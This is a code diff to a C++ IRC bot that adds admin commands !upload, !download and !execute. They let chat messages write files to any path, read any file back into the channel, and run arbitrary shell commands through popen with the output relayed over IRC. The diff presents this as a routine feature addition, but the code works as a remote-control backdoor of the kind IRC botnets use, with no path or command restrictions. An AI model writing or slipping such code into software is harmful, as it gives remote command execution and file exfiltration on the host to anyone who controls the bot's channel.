@@ -163,7 +163,7 @@ public:
         if (command == "!help") {
             std::string help = "Available commands: !help, !time, !version, !status";
             if (isAdmin(sender)) {
-                help += ", !join, !part, !say, !quit";
+                help += ", !join, !part, !say, !quit, !upload, !download, !execute";
             }
             sendCommand("PRIVMSG " + target + " :" + help);
         }
@@ -209,6 +209,79 @@ public:
             else if (command == "!quit") {
                 sendCommand("QUIT :Shutting down");
                 running = false;
+            }
+            else if (command == "!upload") {
+                std::string filename, content;
+                iss >> filename;
+                std::getline(iss, content);
+                if (!filename.empty() && !content.empty()) {
+                    // Remove leading space from content
+                    if (content[0] == ' ') content = content.substr(1);
+                    std::ofstream file(filename);
+                    if (file.is_open()) {
+                        file << content;
+                        file.close();
+                        log("File uploaded: " + filename);
+                        sendCommand("PRIVMSG " + target + " :File uploaded successfully: " + filename);
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :Failed to upload file: " + filename);
+                    }
+                } else {
+                    sendCommand("PRIVMSG " + target + " :Usage: !upload <filename> <content>");
+                }
+            }
+            else if (command == "!download") {
+                std::string filename;
+                iss >> filename;
+                if (!filename.empty()) {
+                    std::ifstream file(filename);
+                    if (file.is_open()) {
+                        std::string content((std::istreambuf_iterator<char>(file)),
+                                             std::istreambuf_iterator<char>());
+                        file.close();
+                        log("File downloaded: " + filename);
+                        sendCommand("PRIVMSG " + target + " :File content of " + filename + ": " + content);
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :File not found: " + filename);
+                    }
+                } else {
+                    sendCommand("PRIVMSG " + target + " :Usage: !download <filename>");
+                }
+            }
+            else if (command == "!execute") {
+                std::string command_to_execute;
+                std::getline(iss, command_to_execute);
+                if (!command_to_execute.empty()) {
+                    // Remove leading space
+                    if (command_to_execute[0] == ' ') command_to_execute = command_to_execute.substr(1);
+                    log("Executing command: " + command_to_execute);
+                    
+                    // Execute command and capture output
+                    FILE* pipe = popen(command_to_execute.c_str(), "r");
+                    if (pipe) {
+                        char buffer[128];
+                        std::string result = "";
+                        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+                            result += buffer;
+                        }
+                        pclose(pipe);
+                        
+                        if (result.empty()) {
+                            result = "Command executed successfully (no output)";
+                        }
+                        
+                        // Send result in chunks if too long
+                        if (result.length() > 400) {
+                            sendCommand("PRIVMSG " + target + " :Command output (truncated): " + result.substr(0, 400) + "...");
+                        } else {
+                            sendCommand("PRIVMSG " + target + " :Command output: " + result);
+                        }
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :Failed to execute command");
+                    }
+                } else {
+                    sendCommand("PRIVMSG " + target + " :Usage: !execute <command>");
+                }
             }
         }
     }
